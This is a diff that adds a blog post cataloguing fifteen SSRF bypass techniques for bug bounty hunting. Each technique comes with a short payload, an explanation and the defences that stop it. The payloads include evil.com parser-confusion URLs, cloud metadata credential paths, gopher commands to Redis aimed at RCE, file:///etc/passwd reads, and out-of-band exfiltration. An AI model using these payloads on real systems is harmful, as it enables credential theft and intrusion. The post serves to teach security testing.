@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Advanced SSRF Bypass Techniques (2024–2026) — AryterLog</title>
+
+  <!-- PWA -->
+  <link rel="manifest" href="../../manifest.json">
+  <meta name="theme-color" content="#080b10">
+  <link rel="icon" href="../../icons/favicon-32.png" sizes="32x32" type="image/png">
+  <link rel="apple-touch-icon" href="../../icons/apple-touch-icon.png">
+  <meta name="description" content="Deep dive into modern SSRF bypass techniques including parser confusion, DNS rebinding, protocol smuggling, cloud metadata abuse, and real-world exploitation chains used in bug bounty hunting.">
+  <link rel="canonical" href="https://giriaryan694-a11y.github.io/AryterLog/posts/advanced-ssrf-bypass-techniques-2026/">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Advanced SSRF Bypass Techniques (2024–2026)">
+  <meta property="og:description" content="Deep dive into modern SSRF bypass techniques including parser confusion, DNS rebinding, protocol smuggling, cloud metadata abuse, and real-world exploitation chains used in bug bounty hunting.">
+  <meta property="og:url" content="https://giriaryan694-a11y.github.io/AryterLog/posts/advanced-ssrf-bypass-techniques-2026/">
+  <meta property="og:site_name" content="AryterLog">
+  <meta property="article:published_time" content="2026-04-25T00:00:00.000Z">
+  <meta property="article:tag" content="web-security">
+  <meta property="article:tag" content="bug-bounty">
+  <meta property="article:tag" content="attack-techniques">
+  <meta property="article:tag" content="cloud-security">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Advanced SSRF Bypass Techniques (2024–2026)">
+  <meta name="twitter:description" content="Deep dive into modern SSRF bypass techniques including parser confusion, DNS rebinding, protocol smuggling, cloud metadata abuse, and real-world exploitation chains used in bug bounty hunting.">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Advanced SSRF Bypass Techniques (2024–2026)","description":"Deep dive into modern SSRF bypass techniques including parser confusion, DNS rebinding, protocol smuggling, cloud metadata abuse, and real-world exploitation chains used in bug bounty hunting.","datePublished":"2026-04-25T00:00:00.000Z","author":{"@type":"Person","name":"Aryan Giri"},"publisher":{"@type":"Organization","name":"AryterLog"},"mainEntityOfPage":"https://giriaryan694-a11y.github.io/AryterLog/posts/advanced-ssrf-bypass-techniques-2026/","keywords":"web-security, bug-bounty, attack-techniques, cloud-security"}</script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&family=Bebas+Neue&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg:#080b10; --surface:#0d1117; --surface2:#111820; --surface3:#161d27;
+      --text:#d0dbe8; --text2:#7a8a9a; --accent:#00ff88; --accent2:#0ea5e9;
+      --danger:#ff4560; --border:#1e2a38; --border2:#2a3848; --code-bg:#0a0f16;
+      --glow:rgba(0,255,136,0.08); --glow2:rgba(0,255,136,0.18);
+    }
+    .light {
+      --bg:#f5f7fa; --surface:#ffffff; --surface2:#f0f4f8; --surface3:#e8eef5;
+      --text:#111827; --text2:#6b7280; --accent:#059669; --accent2:#0284c7;
+      --danger:#dc2626; --border:#e2e8f0; --border2:#cbd5e1; --code-bg:#f1f5f9;
+      --glow:rgba(5,150,105,0.07); --glow2:rgba(5,150,105,0.14);
+    }
+    .eye-saver {
+      --bg:#12100a; --surface:#1a1608; --surface2:#211c0c; --surface3:#282210;
+      --text:#e8d8b0; --text2:#9a8860; --accent:#f5c542; --accent2:#e08030;
+      --danger:#e05050; --border:#302810; --border2:#3d3418; --code-bg:#0f0d06;
+      --glow:rgba(245,197,66,0.08); --glow2:rgba(245,197,66,0.18);
+    }
+
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body {
+      font-family:'Fira Code',monospace;
+      background:var(--bg); color:var(--text);
+      min-height:100vh; overflow-x:hidden;
+      transition:background 0.4s,color 0.4s;
+    }
+    body::before {
+      content:''; position:fixed; inset:0; pointer-events:none; z-index:0;
+      background-image:linear-gradient(var(--border) 1px,transparent 1px),linear-gradient(90deg,var(--border) 1px,transparent 1px);
+      background-size:44px 44px; opacity:0.25;
+    }
+
+    header {
+      position:sticky; top:0; z-index:200;
+      background:rgba(8,11,16,0.86); backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);
+      display:flex; align-items:center; justify-content:space-between;
+      padding:0 22px; height:56px; gap:12px;
+    }
+    .light header{background:rgba(245,247,250,0.9);}
+    .eye-saver header{background:rgba(18,16,10,0.9);}
+    header::after {
+      content:''; position:absolute; bottom:-1px; left:8%; right:8%; height:1px;
+      background:linear-gradient(90deg,transparent,var(--accent),transparent); opacity:0.35;
+    }
+    .header-left{display:flex;align-items:center;gap:12px;flex-shrink:0;}
+
+    .logo {
+      font-family:'Bebas Neue',sans-serif; font-size:24px; font-weight:400;
+      letter-spacing:3px; color:var(--text); text-decoration:none; white-space:nowrap;
+      flex-shrink:0; line-height:1; transition:color 0.2s;
+    }
+    .logo .lo-a{color:var(--accent);}
+    .logo:hover .lo-a{text-shadow:0 0 14px var(--accent);}
+
+    .back-link {
+      display:inline-flex; align-items:center; gap:6px;
+      background:transparent; border:1px solid var(--border2); color:var(--text2);
+      padding:6px 12px; border-radius:6px; cursor:pointer; transition:all 0.2s;
+      font-family:'Fira Code',monospace; font-size:11px; text-decoration:none;
+    }
+    .back-link:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    #theme-btn {
+      background:transparent; border:1px solid var(--border2);
+      padding:5px 11px; cursor:pointer; color:var(--text2); border-radius:6px;
+      transition:all 0.2s; font-family:'Fira Code',monospace; font-size:11px;
+      display:inline-flex; align-items:center; gap:6px; white-space:nowrap;
+    }
+    #theme-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    @keyframes popSpin{0%{transform:scale(0.4) rotate(-60deg);opacity:0;}70%{transform:scale(1.15) rotate(5deg);}100%{transform:scale(1) rotate(0deg);opacity:1;}}
+    .emoji{display:inline-block;}
+
+    main{max-width:760px;margin:0 auto;padding:34px 20px 60px;position:relative;z-index:1;}
+
+    .back-btn {
+      display:inline-flex;align-items:center;gap:7px;margin-bottom:20px;
+      background:var(--surface);border:1px solid var(--border2);color:var(--text2);
+      padding:7px 13px;border-radius:6px;font-family:'Fira Code',monospace;font-size:11px;
+      cursor:pointer;transition:all 0.2s;text-decoration:none;
+    }
+    .back-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+
+    .post-content {
+      background:var(--surface);border:1px solid var(--border);border-radius:12px;
+      padding:34px 30px;position:relative;overflow:hidden;
+    }
+    .post-content::before {
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      border-radius:12px 12px 0 0;
+    }
+    .post-content *{max-width:100%;}
+
+    h1 {
+      font-family:'Space Grotesk',sans-serif;font-size:clamp(19px,4vw,26px);
+      font-weight:700;color:var(--text);margin-bottom:8px;line-height:1.25;word-break:break-word;
+    }
+    .post-header-meta{
+      font-family:'Fira Code',monospace;font-size:11px;color:var(--text2);
+      padding-bottom:18px;margin-bottom:22px;border-bottom:1px solid var(--border);
+      display:flex;gap:8px;flex-wrap:wrap;align-items:center;
+    }
+    .card-cat-chip {
+      display:inline-flex;align-items:center;padding:1px 7px;border-radius:3px;
+      border:1px solid var(--border2);background:var(--surface2);color:var(--text2);
+      font-size:9px;font-family:'Fira Code',monospace;font-weight:500;letter-spacing:0.4px;
+    }
+    h2,h3{font-family:'Space Grotesk',sans-serif;font-weight:600;color:var(--text);margin:26px 0 10px;word-break:break-word;}
+    h2{font-size:19px;} h3{font-size:15px;color:var(--accent);}
+    p{font-size:14px;line-height:1.8;margin-bottom:14px;color:var(--text);}
+    ul,ol{padding-left:20px;margin-bottom:14px;font-size:14px;line-height:1.8;}
+    li{margin-bottom:4px;}
+
+    a{color:var(--accent);word-break:break-all;overflow-wrap:break-word;transition:opacity 0.2s;}
+    a:hover{opacity:0.75;}
+    .post-content a{text-decoration:underline;text-underline-offset:3px;}
+
+    code {
+      background:var(--code-bg);border:1px solid var(--border);padding:2px 6px;
+      border-radius:4px;font-family:'Fira Code',monospace;font-size:0.85em;
+      color:var(--accent);word-break:break-all;overflow-wrap:break-word;
+    }
+    pre {
+      background:var(--code-bg);border:1px solid var(--border);padding:18px;border-radius:8px;
+      max-width:100%; overflow:hidden;
+      position:relative;margin-bottom:14px;
+    }
+    pre::before{
+      content:'';position:absolute;top:0;left:0;right:0;height:2px;
+      background:linear-gradient(90deg,var(--accent),var(--accent2),transparent);
+      opacity:0.5;border-radius:8px 8px 0 0;
+    }
+    pre code{
+      background:transparent;border:none;padding:0 60px 0 0;word-break:normal;
+      overflow-wrap:normal;white-space:pre;display:block;
+      overflow-x:auto;-webkit-overflow-scrolling:touch;
+      font-size:13px;line-height:1.65;color:var(--text);
+    }
+    blockquote{
+      border-left:2px solid var(--accent);margin:14px 0;padding:10px 16px;
+      background:var(--glow);border-radius:0 6px 6px 0;font-style:italic;color:var(--text2);
+    }
+    table{width:100%;border-collapse:collapse;display:block;overflow-x:auto;-webkit-overflow-scrolling:touch;font-size:13px;margin-bottom:14px;}
+    th,td{border:1px solid var(--border);padding:8px 12px;text-align:left;white-space:nowrap;}
+    th{background:var(--surface2);color:var(--accent);font-weight:600;}
+    img{max-width:100%;height:auto;border-radius:8px;display:block;margin:14px 0;}
+
+    .copy-btn {
+      position:absolute;top:9px;right:9px;padding:3px 8px;font-size:10px;
+      font-family:'Fira Code',monospace;font-weight:500;background:var(--surface2);
+      border:1px solid var(--border2);color:var(--text2);border-radius:4px;cursor:pointer;
+      transition:all 0.2s;opacity:0;letter-spacing:0.3px;
+    }
+    pre:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{border-color:var(--accent);color:var(--accent);background:var(--glow);}
+    .copy-btn.copied{border-color:var(--accent);color:var(--accent);opacity:1;}
+
+    footer{
+      text-align:center;padding:22px 16px;color:var(--text2);
+      font-family:'Fira Code',monospace;font-size:11px;
+      border-top:1px solid var(--border);position:relative;z-index:1;
+    }
+    .f-accent{color:var(--accent);}
+    footer a{color:var(--accent);text-decoration:none;}
+    footer a:hover{opacity:0.75;}
+
+    @media(max-width:480px){
+      header{padding:0 13px;height:50px;}
+      .logo{font-size:21px;letter-spacing:2px;}
+      main{padding:20px 14px 44px;}
+      .post-content{padding:20px 14px;}
+      pre{padding:13px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-left">
+      <a href="../../index.html" class="logo">Aryter<span class="lo-a">Log</span></a>
+    </div>
+    <button id="theme-btn" aria-label="Cycle Theme">
+      <span class="emoji" id="theme-emoji">🌙</span>
+      <span id="theme-label">Dark</span>
+    </button>
+  </header>
+
+  <main>
+    <a href="../../index.html#post-advanced-ssrf-bypass-techniques-2026" class="back-btn">← Back to Blog</a>
+    <article class="post-content">
+      <h1>Advanced SSRF Bypass Techniques (2024–2026)</h1>
+      <div class="post-header-meta">
+        <span>📅 Published 2026-04-25</span>
+        <span>·</span><span class="card-cat-chip">web-security</span><span class="card-cat-chip">bug-bounty</span><span class="card-cat-chip">attack-techniques</span><span class="card-cat-chip">cloud-security</span>
+      </div>
+      <p><em>Written by Aryan Giri</em></p>
+<hr>
+<h2>1. URL Parser Confusion (Mixed Parsers)</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>http://127.0.0.1@evil.com
+http://evil.com#@127.0.0.1
+http://127.0.0.1%23@evil.com
+</code></pre>
+<p><strong>Why it works</strong><br>Different components (WAF, backend, HTTP client) parse URLs differently. One layer may validate <code>evil.com</code> while the actual request goes to <code>127.0.0.1</code>. This happens due to inconsistencies in RFC3986 handling (userinfo <code>@</code>, fragments <code>#</code>, encoding).</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>Unified URL parsing across stack (same library everywhere)</li>
+<li>Strict allowlists with resolved IP validation</li>
+</ul>
+<hr>
+<h2>2. DNS Rebinding (Time-of-Check vs Time-of-Use)</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>http://attacker-controlled-domain.com
+</code></pre>
+<p>(Initially resolves to public IP → later rebinds to 127.0.0.1 or 169.254.169.254)</p>
+<p><strong>Why it works</strong><br>Application validates domain once (safe IP), but actual request happens later after DNS changes. Classic TOCTOU bug.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>DNS pinning</li>
+<li>IP re-validation before request</li>
+<li>Low TTL ignored by resolver</li>
+</ul>
+<hr>
+<h2>3. Open Redirect Chaining</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>http://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/
+</code></pre>
+<p><strong>Why it works</strong><br>Target allows only trusted domains. You host SSRF via a trusted domain’s open redirect endpoint, bypassing domain allowlists.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>Redirect following disabled</li>
+<li>Final destination validation enforced</li>
+</ul>
+<hr>
+<h2>4. Cloud Metadata SSRF (IMDSv1/v2 Bypass)</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</code></pre>
+<p><strong>Advanced Bypass (IMDSv2)</strong></p>
+<ul>
+<li>Abuse apps that allow custom headers</li>
+<li>Trigger internal services that already include metadata token</li>
+</ul>
+<p><strong>Why it works</strong><br>Cloud instances expose metadata via link-local IP. Weak protections (IMDSv1) allow unauthenticated access.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>IMDSv2 enforced (token required)</li>
+<li>Network egress filtering</li>
+</ul>
+<hr>
+<h2>5. Protocol Smuggling (Gopher for Raw TCP)</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>gopher://127.0.0.1:6379/_*1\r\n$4\r\nINFO\r\n
+</code></pre>
+<p><strong>Why it works</strong><br>Gopher allows raw TCP payloads. You can interact with internal services (Redis, Memcached, SMTP) directly.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>Protocol filtering (only http/https allowed)</li>
+<li>URL scheme validation</li>
+</ul>
+<hr>
+<h2>6. File Protocol Abuse</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>file:///etc/passwd
+</code></pre>
+<p><strong>Why it works</strong><br>Some backends allow non-HTTP schemes. Leads to local file read (LFI via SSRF).</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>Strict scheme allowlist</li>
+<li>Sandboxed runtime</li>
+</ul>
+<hr>
+<h2>7. HTTP Header Injection via SSRF</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>http://127.0.0.1\r\nX-Forwarded-For: 127.0.0.1
+</code></pre>
+<p><strong>Why it works</strong><br>If SSRF sink doesn’t sanitize CRLF, you can inject headers → bypass internal auth or hit admin endpoints.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>Proper URL encoding</li>
+<li>CRLF sanitization</li>
+</ul>
+<hr>
+<h2>8. IPv6 + Embedded IPv4 Confusion</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>http://[::ffff:127.0.0.1]
+</code></pre>
+<p><strong>Why it works</strong><br>Filters may block IPv4 but allow IPv6. Embedded IPv4 bypasses naive checks.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>Normalization to canonical IP before validation</li>
+</ul>
+<hr>
+<h2>9. DNS Wildcard + Subdomain Takeover Combo</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>http://internal.attacker-owned-domain.com
+</code></pre>
+<p><strong>Why it works</strong><br>If target trusts <code>*.domain.com</code> and you control a dangling subdomain → full SSRF pivot.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>Proper DNS hygiene</li>
+<li>No wildcard trust</li>
+</ul>
+<hr>
+<h2>10. URL Encoding Confusion (Double/Triple Encoding)</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>http://%31%32%37.0.0.1
+http://127.0.0.1%252f..
+</code></pre>
+<p><strong>Why it works</strong><br>Multiple decoding stages → validation sees safe string, request resolves to internal IP.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>Single-pass decoding</li>
+<li>Strict normalization</li>
+</ul>
+<hr>
+<h2>11. SSRF via PDF / Image Renderers</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>&lt;img src=&quot;http://169.254.169.254/latest/meta-data/&quot;&gt;
+</code></pre>
+<p><strong>Why it works</strong><br>Server-side renderers (wkhtmltopdf, headless Chrome) fetch remote resources → hidden SSRF vector.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>Network isolation for renderer</li>
+<li>Resource loading disabled</li>
+</ul>
+<hr>
+<h2>12. Blind SSRF with OOB Interaction</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>http://your-collaborator-domain.com
+</code></pre>
+<p><strong>Why it works</strong><br>No response? Use DNS/HTTP callbacks (Burp Collaborator-style) to confirm SSRF and exfiltrate.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>No outbound connectivity</li>
+<li>DNS logging blocked</li>
+</ul>
+<hr>
+<h2>13. Internal Service Pivoting (SSRF → RCE)</h2>
+<p><strong>Example Payload (Redis RCE chain)</strong></p>
+<pre><code>gopher://127.0.0.1:6379/_CONFIG SET dir /var/www/html
+</code></pre>
+<p><strong>Why it works</strong><br>SSRF is just entry point. Internal services often lack auth → chain to RCE.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>Authenticated services</li>
+<li>Network segmentation</li>
+</ul>
+<hr>
+<h2>14. Host Header Injection via SSRF</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>http://victim.com (with injected Host header)
+</code></pre>
+<p><strong>Why it works</strong><br>Internal routing decisions depend on Host header. SSRF + header control = access hidden vhosts.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>Strict host validation</li>
+</ul>
+<hr>
+<h2>15. WAF Bypass via Scheme Confusion</h2>
+<p><strong>Example Payload</strong></p>
+<pre><code>http://127.1
+http://0
+http://[::]
+</code></pre>
+<p><strong>Why it works</strong><br>WAF blocks common patterns but misses edge-case representations of localhost.</p>
+<p><strong>When it fails</strong></p>
+<ul>
+<li>Comprehensive IP normalization</li>
+</ul>
+<hr>
+<h1>Real-World Mindset</h1>
+<ul>
+<li><p>SSRF ≠ bug → it’s a pivot primitive</p>
+</li>
+<li><p>Always chain:</p>
+<ul>
+<li>SSRF → metadata → creds → cloud takeover</li>
+<li>SSRF → internal service → RCE</li>
+<li>SSRF → admin panel → privilege escalation</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1>Modern (2026) Trends</h1>
+<ul>
+<li>AI plugins &amp; agents introducing SSRF via tool fetching</li>
+<li>Cloud-native apps exposing internal APIs</li>
+<li>Increased IMDSv2 adoption → forcing creative bypasses</li>
+<li>SSRF via supply-chain (third-party integrations)</li>
+</ul>
+<hr>
+
+    </article>
+  </main>
+
+  <footer>
+    <span class="f-accent">$</span> echo "Made by <span class="f-accent">Aryan Giri</span>" &nbsp;·&nbsp; <a href="https://github.com/giriaryan694-a11y" target="_blank" rel="noopener noreferrer">GitHub</a>
+  </footer>
+
+  <script>
+    /* Theme — synced with main site via same cookie */
+    const themes=["dark","light","eye-saver"];
+    const themeData={"dark":{emoji:"🌙",label:"Dark"},"light":{emoji:"☀️",label:"Light"},"eye-saver":{emoji:"☕",label:"Reading"}};
+    function setCookie(n,v,d){const e=new Date();e.setTime(e.getTime()+d*86400000);document.cookie=`${n}=${v};expires=${e.toUTCString()};path=/`;}
+    function getCookie(n){const m=document.cookie.match(new RegExp('(^| )'+n+'=([^;]+)'));return m?m[2]:null;}
+    let currentTheme=getCookie("site_theme")||"dark";
+    const themeBtn=document.getElementById("theme-btn");
+    const themeEmoji=document.getElementById("theme-emoji");
+    function applyTheme(theme,animate=false){
+      document.body.className=theme==="dark"?"":theme;
+      themeEmoji.textContent=themeData[theme].emoji;
+      document.getElementById("theme-label").textContent=themeData[theme].label;
+      setCookie("site_theme",theme,365);
+      if(animate){themeEmoji.style.animation="none";themeEmoji.offsetHeight;themeEmoji.style.animation="popSpin 0.4s cubic-bezier(0.175,0.885,0.32,1.275) forwards";}
+    }
+    applyTheme(currentTheme);
+    themeBtn.addEventListener("click",()=>{currentTheme=themes[(themes.indexOf(currentTheme)+1)%themes.length];applyTheme(currentTheme,true);});
+
+    /* Links → new tab + copy buttons on code blocks */
+    document.querySelectorAll(".post-content a").forEach(l => {
+      l.setAttribute("target", "_blank");
+      l.setAttribute("rel", "noopener noreferrer");
+    });
+    document.querySelectorAll("pre").forEach(pre => {
+      const code = pre.querySelector("code");
+      if (!code) return;
+      const btn = document.createElement("button");
+      btn.className = "copy-btn";
+      btn.textContent = "copy";
+      btn.onclick = async () => {
+        try { await navigator.clipboard.writeText(code.innerText.trimEnd()); }
+        catch {}
+        btn.textContent = "✓ copied"; btn.classList.add("copied");
+        setTimeout(() => { btn.textContent = "copy"; btn.classList.remove("copied"); }, 2000);
+      };
+      pre.appendChild(btn);
+    });
+  </script>
+</body>
+</html>
